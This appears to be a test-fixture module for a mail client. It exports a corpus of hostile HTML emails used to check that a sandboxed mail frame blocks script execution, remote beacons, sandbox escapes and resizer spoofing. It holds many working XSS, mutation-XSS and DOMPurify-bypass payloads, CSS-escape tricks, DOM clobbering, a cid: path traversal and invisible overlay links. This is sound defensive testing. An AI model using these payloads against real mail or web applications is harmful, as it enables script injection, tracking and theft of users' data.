#!/usr/bin/env node
// THE MAIL FRAME'S ATTACK CORPUS (lane channel-rich SECURITY verify round 2, 2026-09-28) — ONE implementation
// shared by the chrome leg (test-channels-aggregate-ui ⑩x, over the fake adapter's VIBESPACE_CHANNELS_FAKE_MAIL_DIR
// seam) and the node suite (test-mail-frame ⑭, fast): every mail tries to RUN something in the frame or the top page,
// to REACH a beacon (`B` = an http origin, `S` = an https one), to escape the sandbox, or to spoof the resizer.
// Every entry's beacon paths carry the mail's NAME first, so a hit is attributed to the mail that made it.
// Never a test-*.mjs (the gate census); a new vector is a new row here, and both legs see it.
/** @returns {Array<{name: string, html: string, click?: 'link' | 'submit', pictures?: boolean}>} */
export function mailAttackCorpus(B, S = B) {
  const b = (name, v) => `${B}/${name}/${v}`;
  const s = (name, v) => `${S}/${name}/${v}`;
  const rows = [];
  const add = (name, html, extra = {}) => rows.push({ name, html: typeof html === 'function' ? html((v) => b(name, v), (v) => s(name, v)) : html, ...extra });
  // ── 1. script execution, every syntax ─────────────────────────────────────
  add('script-plain', (u) => `<p>hi</p><script>fetch("${u('script')}")</script>`);
  add('script-src', (u) => `<SCRIPT type="text/javascript" SRC="${u('script-src.js')}"></SCRIPT>`);
  add('script-unclosed', (u) => `<p>x</p><script>fetch("${u('script-unclosed')}")`);
  add('script-split', (u) => `<scr<script>ipt>fetch("${u('split')}")</scr</script>ipt>`);
  add('script-slash', (u) => `<script/xss src="${u('slash.js')}"></script>`);
  add('script-nul', (u) => `<scr\u0000ipt>fetch("${u('nul')}")</scr\u0000ipt>`);
  add('script-in-style-close', (u) => `<style>p{}</style><script>fetch("${u('after-style')}")</script></style>`);
  add('svg-onload', (u) => `<svg onload="fetch('${u('svg')}')"><circle r="4"/></svg>`);
  add('svg-script', (u) => `<svg><script>fetch("${u('svgscript')}")</script></svg>`);
  add('svg-use-href', (u) => `<svg><use href="${u('use.svg')}#x"/><image href="${u('image.png')}"/><feImage href="${u('feimage.png')}"/></svg>`);
  add('img-onerror', (u) => `<img src=x onerror="fetch('${u('onerror')}')">`);
  add('img-onerror-noquote', (u) => `<img src=x onerror=fetch('${u('onerror2')}')>`);
  add('img-onerror-upper-slash', (u) => `<img/src="x"/ONERROR="fetch('${u('onerror3')}')">`);
  add('body-onload', (u) => `<body onload="fetch('${u('body')}')"><p>b</p></body>`);
  add('iframe-src', (u) => `<iframe src="${u('iframe')}"></iframe>`);
  add('iframe-srcdoc', (u) => `<iframe srcdoc="&lt;script&gt;parent.fetch('${u('srcdoc')}')&lt;/script&gt;"></iframe>`);
  add('iframe-breakout', (u) => `</iframe><script>fetch("${u('breakout')}")</script><iframe srcdoc="<script>fetch('${u('srcdoc2')}')</script>"></iframe>`);
  add('object-js', (u) => `<object data="javascript:fetch('${u('object-js')}')"></object><object data="${u('object')}"></object>`);
  add('embed-src', (u) => `<embed src="${u('embed')}"><applet code="${u('applet')}"></applet>`);
  add('math-mglyph', (u) => `<math><mtext><table><mglyph><style><img src=x onerror="fetch('${u('mxss')}')"></style></mglyph></table></mtext></math>`);
  add('math-mi-href', (u) => `<math><mi href="javascript:fetch('${u('mi')}')">x</mi><maction actiontype="statusline#${u('maction')}">y</maction></math>`);
  add('noscript-trick', (u) => `<noscript><p title="</noscript><img src=x onerror=fetch('${u('noscript')}')>"></noscript>`);
  add('template-script', (u) => `<template><script>fetch("${u('template')}")</script><img src="${u('template-img')}"></template>`);
  add('style-expression', (u) => `<div style="width:expression(fetch('${u('expr')}'));behavior:url(${u('behavior.htc')});-moz-binding:url(${u('binding.xml')})">x</div>`);
  add('a-javascript', (u) => `<a href="javascript:fetch('${u('a-js')}')" style="display:block;font-size:40px;padding:20px">CLICK ME</a>`, { click: 'link' });
  add('a-javascript-entities', (u) => `<a href="jav&#x61;script:fetch('${u('a-js-hex')}')" style="display:block;font-size:40px;padding:20px">CLICK</a><a href="&#106avascript:fetch('${u('a-js-dec')}')">d</a><a href="javascript&colon;fetch('${u('a-js-colon')}')">c</a><a href="java\tscript:fetch('${u('a-js-tab')}')">t</a><a href="jav&#x09;ascript:fetch('${u('a-js-tab-ent')}')">te</a><a href="  JaVaScRiPt:fetch('${u('a-js-case')}')">cs</a><a href="vbscript:msgbox('${u('a-vbs')}')">v</a><a href="data:text/html,<script>fetch('${u('a-data')}')</script>">dt</a>`, { click: 'link' });
  add('a-target-top', (u, us) => `<a href="${us('target-top')}" target="_top" ping="${u('ping')}" style="display:block;font-size:40px;padding:20px">TOP</a>`, { click: 'link' });
  add('a-download', (u, us) => `<a href="${us('download')}" download="x.exe" style="display:block;font-size:40px;padding:20px">DL</a>`, { click: 'link' });
  add('form-javascript', (u) => `<form action="javascript:fetch('${u('form-js')}')" method="post"><input name="q" value="1"><button type="submit" style="display:block;font-size:40px;padding:20px">SUBMIT</button></form>`, { click: 'submit' });
  add('form-post', (u) => `<form action="${u('form-post')}" method="post"><input type="image" src="${u('input-image.png')}" alt="go"><button formaction="${u('formaction')}" type="submit" style="display:block;font-size:40px;padding:20px">GO</button></form>`, { click: 'submit' });
  add('meta-refresh-js', (u) => `<meta http-equiv="refresh" content="0;url=javascript:fetch('${u('meta-js')}')"><meta http-equiv="refresh" content="0;url=${u('meta-refresh')}"><p>m</p>`);
  add('base-href', (u) => `<base href="${u('base')}/"><a href="rel.html" style="display:block;font-size:40px;padding:20px">rel</a><img src="rel.png">`, { click: 'link' });
  add('csp-meta-attacker', (u) => `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'; img-src *"><img src="${u('after-csp.png')}"><script>fetch("${u('after-csp')}")</script>`);
  add('meta-referrer', (u, us) => `<meta name="referrer" content="unsafe-url"><img src="${us('referrer.png')}">`, { pictures: true });
  add('link-rels', (u) => `<link rel="stylesheet" href="${u('link.css')}"><link rel="prefetch" href="${u('prefetch')}"><link rel="preconnect" href="${u('preconnect')}"><link rel="dns-prefetch" href="${u('dns')}"><link rel="icon" href="${u('favicon.ico')}"><link rel="preload" as="image" href="${u('preload.png')}"><link rel="manifest" href="${u('manifest.json')}">`);
  add('media', (u) => `<video poster="${u('poster.png')}" src="${u('video.mp4')}"><source src="${u('source.mp4')}"><track src="${u('track.vtt')}"></video><audio src="${u('audio.mp3')}"></audio><picture><source srcset="${u('psource.png')} 1x"><img src="${u('pimg.png')}"></picture><bgsound src="${u('bgsound.mid')}">`);
  add('img-srcset-lazy', (u, us) => `<img srcset="${u('srcset1.png')} 1x, ${u('srcset2.png')} 2x" src="${u('srcset-fallback.png')}"><img loading="lazy" src="${us('lazy.png')}"><img src="${u('plain-http.png')}">`);
  add('css-reach', (u, us) => `<style>@import url(${u('import.css')}); @import "${u('import2.css')}"; body{background:url(${u('css-bg.png')})} .a{background-image:image-set("${u('imageset.png')}" 1x)} .b{cursor:url(${u('cursor.cur')}),auto} .c{list-style-image:url(${u('lsi.png')})} .d::before{content:url(${u('content.png')})} @font-face{font-family:x;src:url(${u('font.woff')})} .e{border-image:url(${u('bi.png')})} .f{mask:url(${us('mask.svg')})} .g{background:url("${us('https-css.png')}")}</style><div class="a b c d e f g" style="background:url(${u('inline.png')});background-image:u\\rl('${u('inline2.png')}');background-image:u&#114;l(${u('inline3.png')})">styled</div>`, { pictures: true });
  add('table-background', (u) => `<table background="${u('table-bg.png')}"><tr><td background="${u('td-bg.png')}">x</td></tr></table><body background="${u('body-bg.png')}">`);
  add('attr-breakout', (u) => `<img alt='"><script>fetch("${u('alt-breakout')}")</script>'><div title="&quot;&gt;&lt;script&gt;fetch('${u('title-breakout')}')&lt;/script&gt;">z</div><p class="x&quot; onmouseover=&quot;fetch('${u('class-breakout')}')">c</p>`);
  add('comment-cdata-pi', (u) => `<!--><script>fetch("${u('comment')}")</script>--><!-- --!><script>fetch("${u('comment2')}")</script> --><![CDATA[<script>fetch("${u('cdata')}")</script>]]><?xml-stylesheet href="${u('pi.xsl')}"?><p>pi</p>`);
  add('raw-text-breakouts', (u) => `<textarea></textarea><script>fetch("${u('textarea')}")</script></textarea><title></title><img src=x onerror=fetch('${u('title')}')></title><xmp><script>fetch("${u('xmp')}")</script></xmp><plaintext><script>fetch("${u('plaintext')}")</script>`);
  add('select-option-style', (u) => `<select><option><style></option></select><img src=x onerror=fetch('${u('select')}')></style>`);
  add('namespace-confusion', (u) => `<svg><p><style><img src=x onerror="fetch('${u('ns1')}')"></style></p></svg><form><math><mtext><table><mglyph><style><img src=x onerror="fetch('${u('ns2')}')"></style></mglyph></table></mtext></math></form><svg></p><style><a id="</style><img src=1 onerror=fetch('${u('ns3')}')>"></style></svg>`);
  add('custom-elements', (u) => `<div is="x-foo" onclick="fetch('${u('is')}')">is</div><x-foo onconnected="fetch('${u('ce')}')">ce</x-foo><slot name="x"></slot><portal src="${u('portal')}"></portal><dialog open onclose="fetch('${u('dialog')}')">d</dialog>`);
  add('dom-clobber', (u) => `<img name="body" id="body" src="${u('clobber.png')}"><form name="parent" id="parent"></form><a id="ResizeObserver" name="postMessage" href="${u('a')}">x</a><input name="documentElement"><img name="querySelectorAll">`);
  add('xlink-href', (u) => `<a xlink:href="javascript:fetch('${u('xlink')}')" style="display:block;font-size:40px;padding:20px">xl</a>`, { click: 'link' });
  add('null-entity-variants', (u) => `<img src="x" onerror&#61;"fetch('${u('ent-eq')}')"><img src="x" \u0000onerror="fetch('${u('nul-attr')}')"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('${u('img-js-ent')}')><img src="jav&#x0A;ascript:fetch('${u('img-js-nl')}')">`);
  // ── 1b. (security verify r2, continued) the remaining DOMPurify-bypass / mXSS classes and CSS escape spellings ──
  add('mxss-noembed-noframes', (u) => `<noembed><img title="</noembed><img src=x onerror=fetch('${u('noembed')}')>"></noembed><noframes><img title="</noframes><img src=x onerror=fetch('${u('noframes')}')>"></noframes><iframe><img title="</iframe><img src=x onerror=fetch('${u('iframe-title')}')>"></iframe>`);
  add('mxss-dompurify-222', (u) => `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('${u('dp222')}') src=1>"></form>`);
  add('mxss-svg-math-style', (u) => `<svg><style><img src=x onerror=fetch('${u('svgstyle')}')></style></svg><math><style><img src=x onerror=fetch('${u('mathstyle')}')></style></math><math><mi><style><img src=x onerror=fetch('${u('mistyle')}')></style></mi></math>`);
  add('mxss-comment-attr', (u) => `<!--<img src="--><img src=x onerror=fetch('${u('comment-attr')}')//"><style><style/><img src=x onerror=fetch('${u('style-style')}')></style><p title="--><img src=x onerror=fetch('${u('title-comment')}')>">t</p>`);
  add('mxss-selectedcontent', (u) => `<select><button><selectedcontent></selectedcontent></button><option><img src=x onerror=fetch('${u('selectedcontent')}')></option></select><selectedcontent><img src=x onerror=fetch('${u('selectedcontent2')}')></selectedcontent>`);
  add('attrs-no-space', (u) => `<img src="x"onerror="fetch('${u('nospace')}')"><img/src=x/onerror=fetch('${u('slashes')}')><img src=x onerror
=fetch('${u('newline-eq')}')><a href="https://ok.example/"onclick="fetch('${u('a-onclick')}')">a</a>`);
  add('css-escapes', (u) => `<style>.a{background:\\75 rl(${u('esc1.png')})} .b{background:u/**/rl(${u('esc2.png')})} .c{background:URL(${u('esc3.png')})} .d{background:url\\28 ${u('esc4.png')}\\29} @\\69mport "${u('esc5.css')}"; .e{background:\\000075rl(${u('esc7.png')})}</style><div class="a b c d e">e</div><div style="background:\\75rl(${u('esc6.png')});background-image:&#117;&#114;&#108;(${u('esc8.png')})">f</div>`);
  add('overlay-link', (u, us) => `<a href="${us('overlay')}" style="position:fixed;top:0;left:0;right:0;bottom:0;opacity:0;z-index:99999">x</a><p>An ordinary mail with an invisible link over all of it.</p>`);
  // ── 2. cid: and our route ─────────────────────────────────────────────────
  add('cid-abuse', (u) => `<img src="cid:logo@fake" width="8" height="8"><img src="cid:fake-poll-room-1-img0"><img src="cid:../../../../etc/passwd"><img src="cid:fake-push-mail-pictures-logo"><img src="cid:${'a'.repeat(300)}"><img src="cid:<logo@fake>">`);
  // ── 3. the resizer and the frame's height ────────────────────────────────
  add('height-animation', () => `<style>@keyframes g{from{height:100px}to{height:19000px}}body{animation:g .2s linear infinite alternate}#z{height:100px}</style><div id="z">animated</div>`);
  add('height-transition', () => `<style>body{height:100px;transition:height 1s}body:hover{height:19000px}</style><p>hover</p>`);
  // a burst of heights PAST the settle (the window narrowed by a drag): the row must end at the LAST posted height
  add('height-burst', () => `<p>${'The quarterly report is attached; please review section three before Friday and reply to all. '.repeat(14)}</p><p>LAST LINE OF THE MAIL</p>`);
  add('huge-fixed-overlay',() => `<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:red;z-index:9999">OVERLAY</div><div style="height:400000px">tall</div><div style="transform:scale(200);width:10px;height:10px;background:blue"></div>`);
  add('many-images', (u) => Array.from({ length: 1000 }, (_, i) => `<img src="${u(`many-${i}.png`)}">`).join(''));
  add('quoted-inject', (u) => `<div class="gmail_quote" data-vs-quote="1"><p>q</p></div><p data-vs-quote="1" data-vs-blocked="1">not a quote</p><button class="vs-q" onclick="fetch('${u('vs-q')}')">fake button</button><div class="vs-open">o</div>`);
  add('pictures-https', (u, us) => `<img src="${us('pic.png')}" width="20" height="20"><img src="${u('http-pic.png')}" width="20" height="20"><img src="//${S.replace(/^https?:\/\//, '')}/${'pictures-https'}/proto-relative.png"><img src="/api/home"><img src="${us('pic2.png')}?x=<script>">`, { pictures: true });
  return rows;
}
